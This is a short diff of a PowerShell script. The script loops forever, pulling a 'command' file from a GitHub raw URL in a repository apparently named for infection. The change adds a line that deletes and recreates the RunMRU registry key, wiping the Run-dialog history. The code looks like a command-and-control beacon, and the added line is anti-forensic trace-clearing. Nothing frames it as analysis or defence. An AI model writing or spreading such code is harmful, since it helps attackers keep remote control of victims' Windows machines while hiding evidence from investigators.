@@ -1,6 +1,7 @@
 while ($true) {
     try {
         $command = (curl "https://raw.githubusercontent.com/GrudgeInfection/Supervisor/refs/heads/main/command").Content
+        Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue; New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue
     }
     catch {
         Write-Error "Error retrieving command: $($_.Exception.Message)"
